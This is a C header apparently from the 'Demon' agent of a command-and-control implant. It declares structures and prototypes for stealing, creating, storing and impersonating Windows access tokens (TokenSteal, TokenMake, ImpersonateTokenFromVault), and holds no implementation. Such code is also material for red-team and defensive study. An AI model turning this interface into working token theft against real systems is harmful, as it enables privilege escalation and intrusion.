#ifndef DEMON_TOKEN_H
#define DEMON_TOKEN_H

#include <windows.h>
#include <Core/Win32.h>

#define TOKEN_TYPE_STOLEN       0x1
#define TOKEN_TYPE_MAKE_NETWORK 0x2

#define TOKEN_OWNER_FLAG_DEFAULT 0x0 /* query domain/user */
#define TOKEN_OWNER_FLAG_USER    0x1 /* query user only */
#define TOKEN_OWNER_FLAG_DOMAIN  0x2 /* query domain only */

#define BUF_SIZE 4096
#define MAX_USERNAME 512

typedef struct _SavedToken
{
    CHAR username[MAX_USERNAME];
    DWORD dwProcessID;
    HANDLE localHandle;
    HANDLE token;
} SavedToken, *PSavedToken;

typedef struct _UniqueUserToken
{
    char username[MAX_USERNAME];
    int token_num;
    DWORD dwProcessID;
    HANDLE localHandle;
    BOOL delegation_available;
    BOOL impersonation_available;
} UniqueUserToken, *PUniqueUserToken;

/* use union for STOLEN and MAKE tokens */
typedef struct _TOKEN_LIST_DATA
{
    HANDLE  Handle;
    LPWSTR  DomainUser;
    DWORD   dwProcessID;
    SHORT   Type;

    // Make data
    LPWSTR   lpUser;
    LPWSTR   lpPassword;
    LPWSTR   lpDomain;

    struct _TOKEN_LIST_DATA* NextToken;
} TOKEN_LIST_DATA, *PTOKEN_LIST_DATA ;

typedef SECURITY_IMPERSONATION_LEVEL SEC_IMP_LEVEL;

/* Token Object Functions */
HANDLE TokenCurrentHandle(
    VOID
);

BOOL TokenElevated(
    IN HANDLE Token
);

BOOL TokenSetPrivilege(
    IN LPSTR Privilege,
    IN BOOL Enable
);

BOOL TokenDuplicate(
    IN  HANDLE        TokenOriginal,
    IN  DWORD         Access,
    IN  SEC_IMP_LEVEL ImpersonateLevel,
    IN  TOKEN_TYPE    TokenType,
    OUT PHANDLE       TokenNew
);

BOOL TokenRevSelf(
    VOID
);

BOOL TokenQueryOwner(
    IN  HANDLE  Token,
    OUT PBUFFER UserDomain,
    IN  DWORD   Flags
);

/* Token Vault Functions */
DWORD TokenAdd(
    IN HANDLE hToken,
    IN LPWSTR DomainUser,
    IN SHORT  Type,
    IN DWORD  dwProcessID,
    IN LPWSTR User,
    IN LPWSTR Domain,
    IN LPWSTR Password
);

BOOL TokenRemove(
    IN DWORD TokenID
);

HANDLE TokenSteal(
    IN DWORD  ProcessID,
    IN HANDLE TargetHandle
);

HANDLE TokenMake(
    IN LPWSTR User,
    IN LPWSTR Password,
    IN LPWSTR Domain
);

PTOKEN_LIST_DATA TokenGet(
    IN DWORD TokenID
);

VOID TokenClear(
    VOID
);

BOOL TokenImpersonate(
    IN BOOL Impersonate
);

BOOL ListTokens(
    OUT PUniqueUserToken* UniqTokens,
    OUT PDWORD            pNumTokens
);

BOOL ImpersonateTokenFromVault(
    IN DWORD TokenID
);

BOOL ImpersonateTokenInStore(
    IN PTOKEN_LIST_DATA TokenData
);

#endif
